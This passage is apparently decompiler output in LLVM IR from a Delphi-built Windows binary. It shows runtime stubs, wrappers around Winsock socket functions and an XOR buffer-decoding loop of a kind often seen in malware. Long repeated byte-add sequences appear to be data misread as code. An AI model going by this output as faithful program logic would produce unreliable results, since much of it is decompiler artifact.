  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1) local_unnamed_addr {
dec_label_pc_404810:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %ecx = alloca i32, align 4
  %eax = alloca i32, align 4
  %4 = add i32 %1, 117, !insn.addr !322
  %5 = inttoptr i32 %4 to i32*, !insn.addr !322
  %6 = load i32, i32* %5, align 4, !insn.addr !322
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !323
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !323
  %11 = add i8 %8, %10, !insn.addr !323
  %12 = inttoptr i32 %9 to i8*, !insn.addr !323
  store i8 %11, i8* %12, align 1, !insn.addr !323
  %13 = load i8, i8* %7, align 4, !insn.addr !324
  %14 = load i32, i32* %eax, align 4
  %15 = trunc i32 %14 to i8, !insn.addr !324
  %16 = add i8 %13, %15, !insn.addr !324
  %17 = inttoptr i32 %14 to i8*, !insn.addr !324
  store i8 %16, i8* %17, align 1, !insn.addr !324
  %18 = load i8, i8* %7, align 4, !insn.addr !325
  %19 = load i32, i32* %eax, align 4
  %20 = trunc i32 %19 to i8, !insn.addr !325
  %21 = add i8 %18, %20, !insn.addr !325
  %22 = inttoptr i32 %19 to i8*, !insn.addr !325
  store i8 %21, i8* %22, align 1, !insn.addr !325
  %23 = load i8, i8* %7, align 4, !insn.addr !326
  %24 = load i32, i32* %eax, align 4
  %25 = trunc i32 %24 to i8, !insn.addr !326
  %26 = add i8 %23, %25, !insn.addr !326
  %27 = inttoptr i32 %24 to i8*, !insn.addr !326
  store i8 %26, i8* %27, align 1, !insn.addr !326
  %28 = load i8, i8* %7, align 4, !insn.addr !327
  %29 = load i32, i32* %eax, align 4
  %30 = trunc i32 %29 to i8, !insn.addr !327
  %31 = add i8 %28, %30, !insn.addr !327
  %32 = inttoptr i32 %29 to i8*, !insn.addr !327
  store i8 %31, i8* %32, align 1, !insn.addr !327
  %33 = load i8, i8* %7, align 4, !insn.addr !328
  %34 = load i32, i32* %eax, align 4
  %35 = trunc i32 %34 to i8, !insn.addr !328
  %36 = add i8 %33, %35, !insn.addr !328
  %37 = inttoptr i32 %34 to i8*, !insn.addr !328
  store i8 %36, i8* %37, align 1, !insn.addr !328
  %38 = load i8, i8* %7, align 4, !insn.addr !329
  %39 = load i32, i32* %eax, align 4
  %40 = trunc i32 %39 to i8, !insn.addr !329
  %41 = add i8 %38, %40, !insn.addr !329
  %42 = inttoptr i32 %39 to i8*, !insn.addr !329
  store i8 %41, i8* %42, align 1, !insn.addr !329
  %43 = load i8, i8* %7, align 4, !insn.addr !330
  %44 = load i32, i32* %eax, align 4
  %45 = trunc i32 %44 to i8, !insn.addr !330
  %46 = add i8 %43, %45, !insn.addr !330
  %47 = inttoptr i32 %44 to i8*, !insn.addr !330
  store i8 %46, i8* %47, align 1, !insn.addr !330
  %48 = load i8, i8* %7, align 4, !insn.addr !331
  %49 = load i32, i32* %eax, align 4
  %50 = trunc i32 %49 to i8, !insn.addr !331
  %51 = add i8 %48, %50, !insn.addr !331
  %52 = inttoptr i32 %49 to i8*, !insn.addr !331
  store i8 %51, i8* %52, align 1, !insn.addr !331
  %53 = load i8, i8* %7, align 4, !insn.addr !332
  %54 = load i32, i32* %eax, align 4
  %55 = trunc i32 %54 to i8, !insn.addr !332
  %56 = add i8 %53, %55, !insn.addr !332
  %57 = inttoptr i32 %54 to i8*, !insn.addr !332
  store i8 %56, i8* %57, align 1, !insn.addr !332
  %58 = load i8, i8* %7, align 4, !insn.addr !333
  %59 = load i32, i32* %eax, align 4
  %60 = trunc i32 %59 to i8, !insn.addr !333
  %61 = add i8 %58, %60, !insn.addr !333
  %62 = inttoptr i32 %59 to i8*, !insn.addr !333
  store i8 %61, i8* %62, align 1, !insn.addr !333
  %63 = load i8, i8* %7, align 4, !insn.addr !334
  %64 = load i32, i32* %eax, align 4
  %65 = trunc i32 %64 to i8, !insn.addr !334
  %66 = add i8 %63, %65, !insn.addr !334
  %67 = inttoptr i32 %64 to i8*, !insn.addr !334
  store i8 %66, i8* %67, align 1, !insn.addr !334
  %68 = load i8, i8* %7, align 4, !insn.addr !335
  %69 = load i32, i32* %eax, align 4
  %70 = trunc i32 %69 to i8, !insn.addr !335
  %71 = add i8 %68, %70, !insn.addr !335
  %72 = inttoptr i32 %69 to i8*, !insn.addr !335
  store i8 %71, i8* %72, align 1, !insn.addr !335
  %73 = load i8, i8* %7, align 4, !insn.addr !336
  %74 = load i32, i32* %eax, align 4
  %75 = trunc i32 %74 to i8, !insn.addr !336
  %76 = add i8 %73, %75, !insn.addr !336
  %77 = inttoptr i32 %74 to i8*, !insn.addr !336
  store i8 %76, i8* %77, align 1, !insn.addr !336
  %78 = load i8, i8* %7, align 4, !insn.addr !337
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !337
  %81 = add i8 %78, %80, !insn.addr !337
  %82 = inttoptr i32 %79 to i8*, !insn.addr !337
  store i8 %81, i8* %82, align 1, !insn.addr !337
  %83 = load i8, i8* %7, align 4, !insn.addr !338
  %84 = load i32, i32* %eax, align 4
  %85 = trunc i32 %84 to i8, !insn.addr !338
  %86 = add i8 %83, %85, !insn.addr !338
  %87 = inttoptr i32 %84 to i8*, !insn.addr !338
  store i8 %86, i8* %87, align 1, !insn.addr !338
  %88 = load i8, i8* %7, align 4, !insn.addr !339
  %89 = load i32, i32* %eax, align 4
  %90 = trunc i32 %89 to i8, !insn.addr !339
  %91 = add i8 %88, %90, !insn.addr !339
  %92 = inttoptr i32 %89 to i8*, !insn.addr !339
  store i8 %91, i8* %92, align 1, !insn.addr !339
  %93 = load i8, i8* %7, align 4, !insn.addr !340
  %94 = load i32, i32* %eax, align 4
  %95 = trunc i32 %94 to i8, !insn.addr !340
  %96 = add i8 %93, %95, !insn.addr !340
  %97 = inttoptr i32 %94 to i8*, !insn.addr !340
  store i8 %96, i8* %97, align 1, !insn.addr !340
  %98 = load i8, i8* %7, align 4, !insn.addr !341
  %99 = load i32, i32* %eax, align 4
  %100 = trunc i32 %99 to i8, !insn.addr !341
  %101 = add i8 %98, %100, !insn.addr !341
  %102 = inttoptr i32 %99 to i8*, !insn.addr !341
  store i8 %101, i8* %102, align 1, !insn.addr !341
  %103 = load i8, i8* %7, align 4, !insn.addr !342
  %104 = load i32, i32* %eax, align 4
  %105 = trunc i32 %104 to i8, !insn.addr !342
  %106 = add i8 %103, %105, !insn.addr !342
  %107 = inttoptr i32 %104 to i8*, !insn.addr !342
  store i8 %106, i8* %107, align 1, !insn.addr !342
  %108 = load i8, i8* %7, align 4, !insn.addr !343
  %109 = load i32, i32* %eax, align 4
  %110 = trunc i32 %109 to i8, !insn.addr !343
  %111 = add i8 %108, %110, !insn.addr !343
  %112 = inttoptr i32 %109 to i8*, !insn.addr !343
  store i8 %111, i8* %112, align 1, !insn.addr !343
  %113 = load i8, i8* %7, align 4, !insn.addr !344
  %114 = load i32, i32* %eax, align 4
  %115 = trunc i32 %114 to i8, !insn.addr !344
  %116 = add i8 %113, %115, !insn.addr !344
  %117 = inttoptr i32 %114 to i8*, !insn.addr !344
  store i8 %116, i8* %117, align 1, !insn.addr !344
  %118 = load i8, i8* %7, align 4, !insn.addr !345
  %119 = load i32, i32* %eax, align 4
  %120 = trunc i32 %119 to i8, !insn.addr !345
  %121 = add i8 %118, %120, !insn.addr !345
  %122 = inttoptr i32 %119 to i8*, !insn.addr !345
  store i8 %121, i8* %122, align 1, !insn.addr !345
  %123 = load i8, i8* %7, align 4, !insn.addr !346
  %124 = load i32, i32* %eax, align 4
  %125 = trunc i32 %124 to i8, !insn.addr !346
  %126 = add i8 %123, %125, !insn.addr !346
  %127 = inttoptr i32 %124 to i8*, !insn.addr !346
  store i8 %126, i8* %127, align 1, !insn.addr !346
  %128 = load i8, i8* %7, align 4, !insn.addr !347
  %129 = load i32, i32* %eax, align 4
  %130 = trunc i32 %129 to i8, !insn.addr !347
  %131 = add i8 %128, %130, !insn.addr !347
  %132 = inttoptr i32 %129 to i8*, !insn.addr !347
  store i8 %131, i8* %132, align 1, !insn.addr !347
  %133 = load i8, i8* %7, align 4, !insn.addr !348
  %134 = load i32, i32* %eax, align 4
  %135 = trunc i32 %134 to i8, !insn.addr !348
  %136 = add i8 %133, %135, !insn.addr !348
  %137 = inttoptr i32 %134 to i8*, !insn.addr !348
  store i8 %136, i8* %137, align 1, !insn.addr !348
  %138 = load i8, i8* %7, align 4, !insn.addr !349
  %139 = load i32, i32* %eax, align 4
  %140 = trunc i32 %139 to i8, !insn.addr !349
  %141 = add i8 %138, %140, !insn.addr !349
  %142 = inttoptr i32 %139 to i8*, !insn.addr !349
  store i8 %141, i8* %142, align 1, !insn.addr !349
  %143 = load i8, i8* %7, align 4, !insn.addr !350
  %144 = load i32, i32* %eax, align 4
  %145 = trunc i32 %144 to i8, !insn.addr !350
  %146 = add i8 %143, %145, !insn.addr !350
  %147 = inttoptr i32 %144 to i8*, !insn.addr !350
  store i8 %146, i8* %147, align 1, !insn.addr !350
  %148 = load i8, i8* %7, align 4, !insn.addr !351
  %149 = load i32, i32* %eax, align 4
  %150 = trunc i32 %149 to i8, !insn.addr !351
  %151 = add i8 %148, %150, !insn.addr !351
  %152 = inttoptr i32 %149 to i8*, !insn.addr !351
  store i8 %151, i8* %152, align 1, !insn.addr !351
  %153 = load i8, i8* %7, align 4, !insn.addr !352
  %154 = load i32, i32* %eax, align 4
  %155 = trunc i32 %154 to i8, !insn.addr !352
  %156 = add i8 %153, %155, !insn.addr !352
  %157 = inttoptr i32 %154 to i8*, !insn.addr !352
  store i8 %156, i8* %157, align 1, !insn.addr !352
  %158 = add i32 %3, 102, !insn.addr !353
  %159 = inttoptr i32 %158 to i8*, !insn.addr !353
  %160 = load i8, i8* %159, align 1, !insn.addr !353
  %161 = udiv i32 %2, 256, !insn.addr !353
  %162 = trunc i32 %161 to i8, !insn.addr !353
  %163 = add i8 %160, %162, !insn.addr !353
  %164 = xor i8 %163, %160, !insn.addr !353
  %165 = xor i8 %163, %162, !insn.addr !353
  %166 = and i8 %164, %165, !insn.addr !353
  %167 = icmp slt i8 %166, 0, !insn.addr !353
  store i8 %163, i8* %159, align 1, !insn.addr !353
  %168 = icmp eq i1 %167, false, !insn.addr !354
  br i1 %168, label %dec_label_pc_4048be, label %dec_label_pc_4048d3, !insn.addr !354

dec_label_pc_4048be:                              ; preds = %dec_label_pc_404810
  %169 = load i8, i8* %7, align 4, !insn.addr !355
  %170 = load i32, i32* %eax, align 4
  %171 = trunc i32 %170 to i8, !insn.addr !355
  %172 = add i8 %169, %171, !insn.addr !355
  %173 = inttoptr i32 %170 to i8*, !insn.addr !355
  store i8 %172, i8* %173, align 1, !insn.addr !355
  %174 = load i8, i8* %7, align 4, !insn.addr !356
  %175 = load i32, i32* %eax, align 4
  %176 = trunc i32 %175 to i8, !insn.addr !356
  %177 = add i8 %174, %176, !insn.addr !356
  %178 = inttoptr i32 %175 to i8*, !insn.addr !356
  store i8 %177, i8* %178, align 1, !insn.addr !356
  %179 = load i8, i8* %7, align 4, !insn.addr !357
  %180 = load i32, i32* %eax, align 4
  %181 = trunc i32 %180 to i8, !insn.addr !357
  %182 = add i8 %179, %181, !insn.addr !357
  %183 = inttoptr i32 %180 to i8*, !insn.addr !357
  store i8 %182, i8* %183, align 1, !insn.addr !357
  %184 = load i8, i8* %7, align 4, !insn.addr !358
  %185 = load i32, i32* %eax, align 4
  %186 = trunc i32 %185 to i8, !insn.addr !358
  %187 = add i8 %184, %186, !insn.addr !358
  %188 = inttoptr i32 %185 to i8*, !insn.addr !358
  store i8 %187, i8* %188, align 1, !insn.addr !358
  %189 = load i8, i8* %7, align 4, !insn.addr !359
  %190 = load i32, i32* %eax, align 4
  %191 = trunc i32 %190 to i8, !insn.addr !359
  %192 = add i8 %189, %191, !insn.addr !359
  %193 = inttoptr i32 %190 to i8*, !insn.addr !359
  store i8 %192, i8* %193, align 1, !insn.addr !359
  %194 = load i8, i8* %7, align 4, !insn.addr !360
  %195 = load i32, i32* %eax, align 4
  %196 = trunc i32 %195 to i8, !insn.addr !360
  %197 = add i8 %194, %196, !insn.addr !360
  %198 = inttoptr i32 %195 to i8*, !insn.addr !360
  store i8 %197, i8* %198, align 1, !insn.addr !360
  %199 = load i8, i8* %7, align 4, !insn.addr !361
  %200 = load i32, i32* %eax, align 4
  %201 = trunc i32 %200 to i8, !insn.addr !361
  %202 = add i8 %199, %201, !insn.addr !361
  %203 = inttoptr i32 %200 to i8*, !insn.addr !361
  store i8 %202, i8* %203, align 1, !insn.addr !361
  %204 = load i8, i8* %7, align 4, !insn.addr !362
  %205 = load i32, i32* %eax, align 4
  %206 = trunc i32 %205 to i8, !insn.addr !362
  %207 = add i8 %204, %206, !insn.addr !362
  %208 = inttoptr i32 %205 to i8*, !insn.addr !362
  store i8 %207, i8* %208, align 1, !insn.addr !362
  %209 = load i8, i8* %7, align 4, !insn.addr !363
  %210 = load i32, i32* %eax, align 4
  %211 = trunc i32 %210 to i8, !insn.addr !363
  %212 = add i8 %209, %211, !insn.addr !363
